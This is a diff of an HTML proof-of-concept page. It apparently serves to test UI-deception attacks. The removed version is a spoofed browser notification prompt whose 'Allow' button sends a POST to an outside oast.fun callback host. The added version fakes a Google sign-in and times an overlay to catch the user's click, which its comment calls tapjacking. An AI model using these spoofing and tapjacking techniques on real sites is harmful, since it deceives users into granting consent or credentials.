@@ -1,97 +1,84 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Prompt Overlay Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Sign In</title>
   <style>
     body {
       margin: 0;
       font-family: sans-serif;
-      background: #f4f4f4;
-      height: 100vh;
       overflow: hidden;
     }
+    .real-content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #fff;
+    }
+    .real-content button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
 
-    .content {
-      padding: 60px;
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255, 255, 255, 0.9);
+      z-index: 9999;
+      pointer-events: none;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .fake-ui {
+      background: white;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      font-size: 16px;
       text-align: center;
     }
-
-    .fake-prompt {
-      position: absolute;
-      top: 8px;
-      left: 8px;
-      background: white;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      width: 300px;
-      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-      z-index: 99999;
-      padding: 12px;
-    }
-
-    .fake-prompt h4 {
-      margin: 0 0 8px;
-      font-weight: 600;
-      font-size: 14px;
-    }
-
-    .fake-prompt p {
-      margin: 0 0 12px;
-      font-size: 13px;
-      color: #555;
-    }
-
-    .prompt-buttons {
-      display: flex;
-      justify-content: flex-end;
-    }
-
-    .prompt-buttons button {
-      padding: 6px 12px;
-      margin-left: 8px;
-      font-size: 13px;
-      border: none;
-      border-radius: 3px;
-      cursor: pointer;
-    }
-
-    .allow-btn {
-      background-color: #1a73e8;
-      color: white;
-    }
-
-    .block-btn {
-      background-color: #ddd;
+    .fake-ui button {
+      margin-top: 20px;
+      padding: 10px 20px;
     }
   </style>
 </head>
 <body>
 
-  <div class="content">
-    <h1>Welcome to News Central</h1>
-    <p>Please wait while we load notifications...</p>
+<div class="real-content">
+  <h2>Continue with your Google account</h2>
+  <button id="loginBtn">🔒 Sign in with Google</button>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="fake-ui">
+    <p>Connecting securely to Google...</p>
+    <button disabled>🔒 Authorizing...</button>
   </div>
+</div>
 
-  <!-- Fake browser-style permission prompt -->
-  <div class="fake-prompt" id="spoofPrompt">
-    <h4>https://news-central.com wants to</h4>
-    <p>Show notifications</p>
-    <div class="prompt-buttons">
-      <button class="block-btn">Block</button>
-      <button class="allow-btn" onclick="steal()">Allow</button>
-    </div>
-  </div>
+<script>
+  setTimeout(() => {
+    // Simulate loading state — overlay is visible but not clickable
+    const overlay = document.getElementById('overlay');
+    overlay.style.pointerEvents = 'none';
 
-  <script>
-    function steal() {
-      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ consent: "user clicked allow on spoof prompt" })
-      });
+    // Trigger tapjacking by re-enabling pointer-events just before likely click
+    setTimeout(() => {
+      overlay.style.pointerEvents = 'auto';
+    }, 2000); // adjust timing to overlap with user click
+  }, 500); // delay before overlay appears
+</script>
 
-      document.getElementById('spoofPrompt').innerHTML = '<p>✔️ Notifications enabled</p>';
-    }
-  </script>
 </body>
 </html>
